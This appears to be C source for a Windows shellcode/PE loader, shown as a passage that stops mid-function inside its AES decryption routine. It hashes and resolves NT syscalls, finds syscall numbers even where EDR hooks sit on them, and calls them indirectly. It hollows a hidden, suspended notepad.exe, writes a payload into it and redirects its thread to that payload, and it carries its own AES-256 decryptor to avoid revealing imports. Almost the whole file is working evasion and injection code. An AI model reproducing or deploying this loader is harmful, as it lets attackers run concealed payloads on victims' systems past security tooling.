#include<Windows.h>
#include<stdio.h>
#include<winternl.h>
#include"Common.h"

#define RANGE 255
#define UP -32
#define DOWN 32

#define HASH(API) crc32h((char*) API)
#define STR "_CRC32"

#define NtAllocateVirtualMemory_CRC32    0xE0762FEB
#define NtProtectVirtualMemory_CRC32     0x5C2D1A97
#define NtWriteVirtualMemory_CRC32       0xE4879939
#define NtReadVirtualMemory_CRC32        0x81223212
#define NtQueryInformationProcess_CRC32  0xA5C44C50
#define NtUnmapViewOfSection_CRC32       0x90483FF6
#define NtGetContextThread_CRC32         0xD3534981
#define NtSetContextThread_CRC32         0xE1453B98
#define NtResumeThread_CRC32             0x6273B572
#define NtTerminateProcess_CRC32         0x94FCB0C0
#define NtClose_CRC32                    0x0D09C750
#define NtWaitForSingleObject_CRC32         0xDD554681

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef ProcessBasicInformation
#define ProcessBasicInformation ((PROCESSINFOCLASS)0)
#endif
#ifndef ProcessExitCode
#define ProcessExitCode ((PROCESSINFOCLASS)5)
#endif

typedef struct _NT_SYSCALL {
	DWORD dwSSn;
	DWORD dwSyscallHash;
	PVOID pSyscallAddress;
	PVOID pSyscallInstAddress;
}NT_SYSCALL, * PNT_SYSCALL;

typedef struct _NTDLL_CONFIG {
	PDWORD pdwArraryOfAddresses; // The Virtual Addr of the array of addresses of the the NTDLL's exported functions
	PDWORD pdwArrayOfNames; // The Virtual Addr of the array of names of the NTDLL's exported functions
	PWORD pwArrayOfOrdinals; // The Virtual Addr of the array of ordinals of the NTDLL's exported functions
	DWORD dwNumberOfNames; // The number of exported functions from ntdll.dll
	ULONG_PTR uModuleAddress; // The base addr of the NTDLL.dll
}NTDLL_CONFIG, * PNTDLL_CONFIG;

// declaration for storing the values of the NTDLL file
NTDLL_CONFIG g_NTDLLConf = { 0 };

typedef struct _NTAPI_FUNC
{
	NT_SYSCALL NtAllocateVirtualMemory;
	NT_SYSCALL NtWriteVirtualMemory;
	NT_SYSCALL NtProtectVirtualMemory;
	NT_SYSCALL NtReadVirtualMemory;
	NT_SYSCALL NtQueryInformationProcess;
	NT_SYSCALL NtUnmapViewOfSection;
	NT_SYSCALL NtGetContextThread;
	NT_SYSCALL NtSetContextThread;
	NT_SYSCALL NtResumeThread;
	NT_SYSCALL NtTerminateProcess;
	NT_SYSCALL NtClose;
	NT_SYSCALL NtWaitForSingleObject;
}NTAPI_FUNC, * PNTAPI_FUNC;

NTAPI_FUNC g_Nt = { 0 };

BOOL InitNtdllConfigStructure() {
	// getting peb
	PPEB pPeb = (PPEB)__readgsqword(0x60);
	if (!pPeb) {
		return FALSE;
	}
	//getting the base address of ntdll!!
	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	ULONG_PTR uModuleBase = (ULONG_PTR)(pLdr->DllBase);
	if (!uModuleBase)
		return FALSE;

	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)uModuleBase;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;


	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModuleBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;


	PIMAGE_EXPORT_DIRECTORY pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(uModuleBase + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	if (!pImgExpDir)
		return FALSE;

	g_NTDLLConf.uModuleAddress = uModuleBase;
	g_NTDLLConf.dwNumberOfNames = pImgExpDir->NumberOfNames;
	g_NTDLLConf.pdwArrayOfNames = (PDWORD)(pImgExpDir->AddressOfNames + uModuleBase);
	g_NTDLLConf.pdwArraryOfAddresses = (PDWORD)(uModuleBase + pImgExpDir->AddressOfFunctions);
	g_NTDLLConf.pwArrayOfOrdinals = (PWORD)(uModuleBase + pImgExpDir->AddressOfNameOrdinals);

	if (!g_NTDLLConf.uModuleAddress || !g_NTDLLConf.dwNumberOfNames || !g_NTDLLConf.pdwArrayOfNames || !g_NTDLLConf.pdwArraryOfAddresses
		|| !g_NTDLLConf.pwArrayOfOrdinals)
		return FALSE;

	return TRUE;
}


BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {
	if (!g_NTDLLConf.uModuleAddress) {
		if (!InitNtdllConfigStructure())
			return FALSE;
	}

	if (dwSysHash != 0)
		pNtSys->dwSyscallHash = dwSysHash;
	else
		return FALSE;

	for (size_t i = 0; i < g_NTDLLConf.dwNumberOfNames; i++) {
		PVOID FunctionName = (PCHAR)(g_NTDLLConf.uModuleAddress + g_NTDLLConf.pdwArrayOfNames[i]);
		PVOID FuncAddress = (PVOID)(g_NTDLLConf.pdwArraryOfAddresses[g_NTDLLConf.pwArrayOfOrdinals[i]] + g_NTDLLConf.uModuleAddress);

		if (HASH(FunctionName) == dwSysHash) {
			pNtSys->pSyscallAddress = FuncAddress;
			/*WORD cw = 0;*/

			while (TRUE) {
				if (*((PBYTE)(FuncAddress)) == 0x4c
					&& *((PBYTE)(FuncAddress)+1) == 0x8b
					&& *((PBYTE)(FuncAddress)+2) == 0xd1
					&& *((PBYTE)(FuncAddress)+3) == 0xb8
					&& *((PBYTE)(FuncAddress)+6) == 0x00
					&& *((PBYTE)(FuncAddress)+7) == 0x00) {

					BYTE high = *((PBYTE)(FuncAddress)+5);
					BYTE low = *((PBYTE)(FuncAddress)+4);

					pNtSys->dwSSn = (high << 8) | low;
					break;

				}
				// if hooked - scenario 1 
				if (*((PBYTE)FuncAddress) == 0xe9) {
					for (WORD idx = 1; idx <= RANGE; idx++) {
						//checking neighbouring syscall down
						if (*((PBYTE)(FuncAddress)+idx * DOWN) == 0x4c
							&& *((PBYTE)(FuncAddress)+1 + idx * DOWN) == 0x8b
							&& *((PBYTE)(FuncAddress)+2 + idx * DOWN) == 0xd1
							&& *((PBYTE)(FuncAddress)+3 + idx * DOWN) == 0xb8
							&& *((PBYTE)(FuncAddress)+6 + idx * DOWN) == 0x00
							&& *((PBYTE)(FuncAddress)+7 + idx * DOWN) == 0x00) {

							BYTE high = *((PBYTE)(FuncAddress)+5 + idx * DOWN);
							BYTE low = *((PBYTE)(FuncAddress)+4 + idx * DOWN);

							pNtSys->dwSSn = (high << 8) | low - idx;
							break;
						}
						//checing neighbouring syscall up
						if (*((PBYTE)(FuncAddress)+idx * UP) == 0x4c
							&& *((PBYTE)(FuncAddress)+1 + idx * UP) == 0x8b
							&& *((PBYTE)(FuncAddress)+2 + idx * UP) == 0xd1
							&& *((PBYTE)(FuncAddress)+3 + idx * UP) == 0xb8
							&& *((PBYTE)(FuncAddress)+6 + idx * UP) == 0x00
							&& *((PBYTE)(FuncAddress)+7 + idx * UP) == 0x00) {

							BYTE high = *((PBYTE)(FuncAddress)+5 + idx * UP);
							BYTE low = *((PBYTE)(FuncAddress)+4 + idx * UP);

							pNtSys->dwSSn = (high << 8) | low + idx;
							break;
						}
					}
				}
				//if hooked - scenario 2
				if (*((PBYTE)FuncAddress + 3) == 0xe9) {
					for (WORD idx = 1; idx <= RANGE; idx++) {
						//checking neighbouring syscall down
						if (*((PBYTE)(FuncAddress)+idx * DOWN) == 0x4c
							&& *((PBYTE)(FuncAddress)+1 + idx * DOWN) == 0x8b
							&& *((PBYTE)(FuncAddress)+2 + idx * DOWN) == 0xd1
							&& *((PBYTE)(FuncAddress)+3 + idx * DOWN) == 0xb8
							&& *((PBYTE)(FuncAddress)+6 + idx * DOWN) == 0x00
							&& *((PBYTE)(FuncAddress)+7 + idx * DOWN) == 0x00) {
							BYTE high = *((PBYTE)(FuncAddress)+5 + idx * DOWN);
							BYTE low = *((PBYTE)(FuncAddress)+4 + idx * DOWN);
							pNtSys->dwSSn = (high << 8) | low - idx;
							break;
						}
						//checing neighbouring syscall up
						if (*((PBYTE)(FuncAddress)+idx * UP) == 0x4c
							&& *((PBYTE)(FuncAddress)+1 + idx * UP) == 0x8b
							&& *((PBYTE)(FuncAddress)+2 + idx * UP) == 0xd1
							&& *((PBYTE)(FuncAddress)+3 + idx * UP) == 0xb8
							&& *((PBYTE)(FuncAddress)+6 + idx * UP) == 0x00
							&& *((PBYTE)(FuncAddress)+7 + idx * UP) == 0x00) {
							BYTE high = *((PBYTE)(FuncAddress)+5 + idx * UP);
							BYTE low = *((PBYTE)(FuncAddress)+4 + idx * UP);
							pNtSys->dwSSn = (high << 8) | low + idx;
							break;
						}
					}
				}
				break;
			}
		}

	}
	if (!pNtSys->pSyscallAddress)
		return FALSE;
	//code to find the syscall from ntdll.dll
	ULONG_PTR uFuncAddress = (ULONG_PTR)pNtSys->pSyscallAddress + 0xFF; // we can choose any random number
	for (DWORD z = 0, x = 1; z <= RANGE; z++, x++) {
		if (*((PBYTE)uFuncAddress + z) == 0x0F && *((PBYTE)uFuncAddress + x) == 0x05) {
			pNtSys->pSyscallInstAddress = (PVOID)((ULONG_PTR)uFuncAddress + z);
			break;
		}
	}
	if (pNtSys->dwSSn != 0 && pNtSys->pSyscallAddress != NULL && pNtSys->dwSyscallHash != 0
		&& pNtSys->pSyscallInstAddress != NULL)
		return TRUE;
	else
		return FALSE;

}

#ifndef ARRAYSIZE
#define ARRAYSIZE(a) (sizeof((a)) / sizeof((a)[0]))
#endif

BOOL InitSyscalls() {
	// { hash, output slot, display name }
	struct {
		DWORD dwHash;
		PNT_SYSCALL pSys;
		const char* szName;
	} aTable[] = {
		{ NtAllocateVirtualMemory_CRC32,	&g_Nt.NtAllocateVirtualMemory,		"NtAllocateVirtualMemory" },
		{ NtWriteVirtualMemory_CRC32,		&g_Nt.NtWriteVirtualMemory,			"NtWriteVirtualMemory" },
		{ NtProtectVirtualMemory_CRC32,		&g_Nt.NtProtectVirtualMemory,		"NtProtectVirtualMemory" },
		{ NtReadVirtualMemory_CRC32,		&g_Nt.NtReadVirtualMemory,			"NtReadVirtualMemory" },
		{ NtQueryInformationProcess_CRC32,	&g_Nt.NtQueryInformationProcess,	"NtQueryInformationProcess" },
		{ NtUnmapViewOfSection_CRC32,		&g_Nt.NtUnmapViewOfSection,			"NtUnmapViewOfSection" },
		{ NtGetContextThread_CRC32,			&g_Nt.NtGetContextThread,			"NtGetContextThread" },
		{ NtSetContextThread_CRC32,			&g_Nt.NtSetContextThread,			"NtSetContextThread" },
		{ NtResumeThread_CRC32,				&g_Nt.NtResumeThread,				"NtResumeThread" },
		{ NtTerminateProcess_CRC32,			&g_Nt.NtTerminateProcess,			"NtTerminateProcess" },
		{ NtClose_CRC32,					&g_Nt.NtClose,						"NtClose" },
		{ NtWaitForSingleObject_CRC32,		&g_Nt.NtWaitForSingleObject,				"NtWaitForSingleObject" },
	};

	for (DWORD i = 0; i < ARRAYSIZE(aTable); i++) {
		if (!FetchNtSyscall(aTable[i].dwHash, aTable[i].pSys)) {
			printf("[!] Failed in Obtaining The Syscall Number of %s !!\n", aTable[i].szName);
			return FALSE;
		}
		printf("[+] Syscall Number Of %s Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
			aTable[i].szName, aTable[i].pSys->dwSSn, aTable[i].pSys->pSyscallInstAddress);
	}
	return TRUE;
}

// Entry-point offset helper: returns the AddressOfEntryPoint for a PE image,
// or 0 for a raw (position-independent) shellcode blob.
DWORD GetEntryPointOffset(IN PBYTE pImage, IN DWORD dwImageSize) {
	if (dwImageSize < 0x40)
		return 0;
	if (pImage[0] != 'M' || pImage[1] != 'Z')
		return 0; // raw shellcode -> entry is the first byte

	DWORD dwPeOff = *(DWORD*)(pImage + 0x3C);
	if (dwPeOff + 0x18 + 0x10 > dwImageSize)
		return 0;
	if (*(WORD*)(pImage + dwPeOff) != IMAGE_NT_SIGNATURE)
		return 0; // 'PE\0\0'

	// PE32 and PE32+ both store AddressOfEntryPoint at OptionalHeader + 0x10
	return *(DWORD*)(pImage + dwPeOff + 0x18 + 0x10);
}

// Classic process hollowing (RunPE) with a raw-shellcode safe path:
//  - Valid PE payload  -> CreateProcessW(suspended) -> read remote PEB image
//    base -> NtUnmapViewOfSection -> allocate at the image base (fallback:
//    any address) -> write image -> hijack Rcx to AddressOfEntryPoint.
//  - Raw shellcode blob -> the target image is intentionally left mapped so
//    the suspended thread's loader initialization (LdrpInitializeProcess)
//    completes against the intact notepad.exe before it jumps to Rcx; the
//    blob is staged in a fresh RW->RX region and Rcx is hijacked to it.
// After resume the child is waited on briefly and its exit status printed,
// which makes a silent loader-init crash (0xC0000005) vs a clean payload
// exit (0) vs a still-running target (0x103) immediately distinguishable.
// The only kernel32 import is CreateProcessW; the rest are direct syscalls.
BOOL HollowAndExecute(IN PBYTE pbPayload, IN SIZE_T sPayloadSize) {

	NTSTATUS STATUS = 0;
	STARTUPINFOW si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	CONTEXT ctx = { 0 };
	PROCESS_BASIC_INFORMATION pbi = { 0 };
	ULONG ulReturnLen = 0, ulOldProtect = 0, ulPrevCount = 0;
	SIZE_T sNumBytes = 0, sRegionSize = 0;
	PVOID pImageBase = NULL, pRemoteMem = NULL;
	DWORD dwEntryOffset = 0, dwExitCode = 0;
	LARGE_INTEGER liTimeout = { 0 };
	BOOLEAN bIsPE = FALSE;

	si.cb = sizeof(STARTUPINFOW);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	if (!CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
		return FALSE;
	}

	dwEntryOffset = GetEntryPointOffset(pbPayload, (DWORD)sPayloadSize);
	bIsPE = (dwEntryOffset != 0);

	// --------------------------------------------------------------
	// (A) PE payload  ->  classic RunPE: replace the mapped image
	// --------------------------------------------------------------
	if (bIsPE) {
		// [A1] Locate the remote PEB (ProcessBasicInformation)
		SetSSn(g_Nt.NtQueryInformationProcess.dwSSn, g_Nt.NtQueryInformationProcess.pSyscallInstAddress);
		if (!NT_SUCCESS(STATUS = RunSyscall(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &ulReturnLen)) || pbi.PebBaseAddress == NULL) {
			goto CLEANUP_FAIL;
		}

		// [A2] Read ImageBaseAddress from the remote PEB (0x10 on x64 / 0x08 on x86)
		SetSSn(g_Nt.NtReadVirtualMemory.dwSSn, g_Nt.NtReadVirtualMemory.pSyscallInstAddress);
#ifdef _WIN64
		if (!NT_SUCCESS(STATUS = RunSyscall(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x10,
			&pImageBase, sizeof(pImageBase), &sNumBytes)) || pImageBase == NULL) {
#else
		if (!NT_SUCCESS(STATUS = RunSyscall(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x08,
			&pImageBase, sizeof(pImageBase), &sNumBytes)) || pImageBase == NULL) {
#endif
			goto CLEANUP_FAIL;
		}

		// [A3] Unmap the original image (required so the payload can occupy the base)
		SetSSn(g_Nt.NtUnmapViewOfSection.dwSSn, g_Nt.NtUnmapViewOfSection.pSyscallInstAddress);
		if (!NT_SUCCESS(STATUS = RunSyscall(pi.hProcess, pImageBase))) {
			goto CLEANUP_FAIL;
		}

		// [A4] Allocate RW memory at the hollowed image base, fallback anywhere
		pRemoteMem = pImageBase;
		sRegionSize = sPayloadSize;
		SetSSn(g_Nt.NtAllocateVirtualMemory.dwSSn, g_Nt.NtAllocateVirtualMemory.pSyscallInstAddress);
		STATUS = RunSyscall(pi.hProcess, &pRemoteMem, 0, &sRegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (!NT_SUCCESS(STATUS) || pRemoteMem == NULL) {
			pRemoteMem = NULL;
			sRegionSize = sPayloadSize;
			STATUS = RunSyscall(pi.hProcess, &pRemoteMem, 0, &sRegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		}
		if (!NT_SUCCESS(STATUS) || pRemoteMem == NULL) {
			goto CLEANUP_FAIL;
		}
		if (pRemoteMem != pImageBase)
			printf("[#] Image Base Unavailable - Payload Mapped At : 0x%p \n", pRemoteMem);

		// [A5] Write the payload image
		SetSSn(g_Nt.NtWriteVirtualMemory.dwSSn, g_Nt.NtWriteVirtualMemory.pSyscallInstAddress);
		if (!NT_SUCCESS(STATUS = RunSyscall(pi.hProcess, pRemoteMem, pbPayload, sPayloadSize, &sNumBytes))) {
			goto CLEANUP_FAIL;
		}

		// [A6] RW -> RX
		sRegionSize = sPayloadSize;
		SetSSn(g_Nt.NtProtectVirtualMemory.dwSSn, g_Nt.NtProtectVirtualMemory.pSyscallInstAddress);
		if (!NT_SUCCESS(STATUS = RunSyscall(pi.hProcess, &pRemoteMem, &sRegionSize, PAGE_EXECUTE_READ, &ulOldProtect))) {
			goto CLEANUP_FAIL;
		}

		// [A7] Keep the remote PEB ImageBaseAddress consistent with the new image
		SetSSn(g_Nt.NtWriteVirtualMemory.dwSSn, g_Nt.NtWriteVirtualMemory.pSyscallInstAddress);
#ifdef _WIN64
		RunSyscall(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x10, &pRemoteMem, sizeof(pRemoteMem), &sNumBytes);
#else
		RunSyscall(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x08, &pRemoteMem, sizeof(pRemoteMem), &sNumBytes);
#endif
		}
	// --------------------------------------------------------------
	// (B) Raw shellcode  ->  stage in a fresh region, keep image intact
	// --------------------------------------------------------------
	else {
		pRemoteMem = NULL;
		sRegionSize = sPayloadSize;
		SetSSn(g_Nt.NtAllocateVirtualMemory.dwSSn, g_Nt.NtAllocateVirtualMemory.pSyscallInstAddress);
		if (!NT_SUCCESS(STATUS = RunSyscall(pi.hProcess, &pRemoteMem, 0, &sRegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))
			|| pRemoteMem == NULL) {
			goto CLEANUP_FAIL;
		}

		SetSSn(g_Nt.NtWriteVirtualMemory.dwSSn, g_Nt.NtWriteVirtualMemory.pSyscallInstAddress);
		if (!NT_SUCCESS(STATUS = RunSyscall(pi.hProcess, pRemoteMem, pbPayload, sPayloadSize, &sNumBytes))) {
			goto CLEANUP_FAIL;
		}

		sRegionSize = sPayloadSize;
		SetSSn(g_Nt.NtProtectVirtualMemory.dwSSn, g_Nt.NtProtectVirtualMemory.pSyscallInstAddress);
		if (!NT_SUCCESS(STATUS = RunSyscall(pi.hProcess, &pRemoteMem, &sRegionSize, PAGE_EXECUTE_READ, &ulOldProtect))) {
			goto CLEANUP_FAIL;
		}
	}

	// --------------------------------------------------------------
	// Hijack the suspended thread entry: on x64 the loader jumps to the
	// value in Rcx (RtlUserThreadStart StartAddress) after initialization;
	// on x86 the entry is in Eax.
	// --------------------------------------------------------------
	ctx.ContextFlags = CONTEXT_FULL;
	SetSSn(g_Nt.NtGetContextThread.dwSSn, g_Nt.NtGetContextThread.pSyscallInstAddress);
	if (!NT_SUCCESS(STATUS = RunSyscall(pi.hThread, &ctx))) {
		goto CLEANUP_FAIL;
	}
#ifdef _WIN64
	ctx.Rcx = (DWORD64)((PBYTE)pRemoteMem + dwEntryOffset);
#else
	ctx.Eax = (DWORD)((PBYTE)pRemoteMem + dwEntryOffset);
#endif
	SetSSn(g_Nt.NtSetContextThread.dwSSn, g_Nt.NtSetContextThread.pSyscallInstAddress);
	if (!NT_SUCCESS(STATUS = RunSyscall(pi.hThread, &ctx))) {
		goto CLEANUP_FAIL;
	}

	// Resume - the payload executes inside the child
	SetSSn(g_Nt.NtResumeThread.dwSSn, g_Nt.NtResumeThread.pSyscallInstAddress);
	if (!NT_SUCCESS(STATUS = RunSyscall(pi.hThread, &ulPrevCount))) {
		goto CLEANUP_FAIL;
	}
	printf("[#] Hollowed Process Resumed : PID %lu @ 0x%p \n", (unsigned long)pi.dwProcessId, pRemoteMem);

	// Diagnostic: wait briefly for the child to finish and print its exit
	// status. 0 = payload ran and exited cleanly (calc spawned), 0xC0000005 =
	// the child crashed before/inside the payload, 0x103 = still running.
	liTimeout.QuadPart = -(LONGLONG)2000 * 10000; // 2 seconds
	SetSSn(g_Nt.NtWaitForSingleObject.dwSSn, g_Nt.NtWaitForSingleObject.pSyscallInstAddress);
	STATUS = RunSyscall(pi.hProcess, FALSE, &liTimeout);
	if (STATUS == 0x00000000L) { // STATUS_WAIT_0
		SetSSn(g_Nt.NtQueryInformationProcess.dwSSn, g_Nt.NtQueryInformationProcess.pSyscallInstAddress);
		if (NT_SUCCESS(RunSyscall(pi.hProcess, ProcessExitCode, &dwExitCode, sizeof(dwExitCode), &ulReturnLen)))
			printf("[#] Hollowed Process Exited With Code : 0x%0.8X \n", dwExitCode);
	}
	else if (STATUS == 0x00000102L) { // STATUS_TIMEOUT
		printf("[#] Hollowed Process Still Running After 2s (exit code 0x103 = alive) \n");
	}
	else {
		printf("[#] NtWaitForSingleObject Status : 0x%0.8X \n", STATUS);
	}

	SetSSn(g_Nt.NtClose.dwSSn, g_Nt.NtClose.pSyscallInstAddress);
	RunSyscall(pi.hThread);
	SetSSn(g_Nt.NtClose.dwSSn, g_Nt.NtClose.pSyscallInstAddress);
	RunSyscall(pi.hProcess);
	return TRUE;

CLEANUP_FAIL:
	SetSSn(g_Nt.NtTerminateProcess.dwSSn, g_Nt.NtTerminateProcess.pSyscallInstAddress);
	RunSyscall(pi.hProcess, (NTSTATUS)0);
	SetSSn(g_Nt.NtClose.dwSSn, g_Nt.NtClose.pSyscallInstAddress);
	RunSyscall(pi.hThread);
	SetSSn(g_Nt.NtClose.dwSSn, g_Nt.NtClose.pSyscallInstAddress);
	RunSyscall(pi.hProcess);
	return FALSE;

	}

/* ================================================================ *
 * Self-contained AES-256-CBC decryption (no CryptoAPI/CNG imports) *
 * Keeps the direct-syscall loader free of extra module dependencies. *
 * ================================================================ */
 /*
  * Self-contained AES-256-CBC decryption.
  * No Windows CryptoAPI / CNG imports - keeps the loader dependency-free.
  * Tables generated from the AES FIPS-197 definition.
  */
#include <stdint.h>
#include <string.h>

static const unsigned char s_sbox[256] = {
	0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
	0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
	0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
	0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
	0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
	0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
	0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
	0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
	0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
	0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
	0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
	0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
	0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
	0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
	0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
	0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,
};

static const unsigned char s_rsbox[256] = {
	0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,
	0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,
	0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,
	0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,
	0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,
	0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,
	0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,
	0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,
	0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,
	0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,
	0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,
	0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,
	0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,
	0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,
	0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,
	0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D,
};


static unsigned char xtime_f(unsigned char x) {
	return (unsigned char)((x << 1) ^ (((x >> 7) & 1) ? 0x1B : 0));
}

static unsigned char gf_mul(unsigned char a, unsigned char b) {
	unsigned char r = 0;
	while (b) {
		if (b & 1) r ^= a;
		a = xtime_f(a);
		b >>= 1;
	}
	return r;
}

static void AddRoundKey(unsigned char state[16], const unsigned char* rk) {
	for (int i = 0; i < 16; i++) state[i] ^= rk[i];
}

static void InvSubBytes(unsigned char state[16]) {
	for (int i = 0; i < 16; i++) state[i] = s_rsbox[state[i]];
}

static void InvShiftRows(unsigned char s[16]) {
	unsigned char t;
	/* row 1 : shift right by 1 */
	t = s[13]; s[13] = s[9];  s[9] = s[5]; s[5] = s[1]; s[1] = t;
	/* row 2 : shift right by 2 (self-inverse) */
	t = s[2];  s[2] = s[10];  s[10] = t;
	t = s[6];  s[6] = s[14];  s[14] = t;
	/* row 3 : shift right by 3 */
	t = s[3];  s[3] = s[7];   s[7] = s[11]; s[11] = s[15]; s[15] = t;
}

static void InvMixColumns(unsigned char state[16]) {
	for (int c = 0; c < 4; c++) {
		unsigned char* col = state + 4 * c;
		unsigned char a0 = col[0], a1 = col[1], a2 = col[2], a3 = col[3];
		col[0] = gf_mul(a0, 14) ^ gf_mul(a1, 11) ^ gf_mul(a2, 13) ^ gf_mul(a3, 9);
		col[1] = gf_mul(a0, 9) ^ gf_mul(a1, 14) ^ gf_mul(a2, 11) ^ gf_mul(a3, 13);
		col[2] = gf_mul(a0, 13) ^ gf_mul(a1, 9) ^ gf_mul(a2, 14) ^ gf_mul(a3, 11);
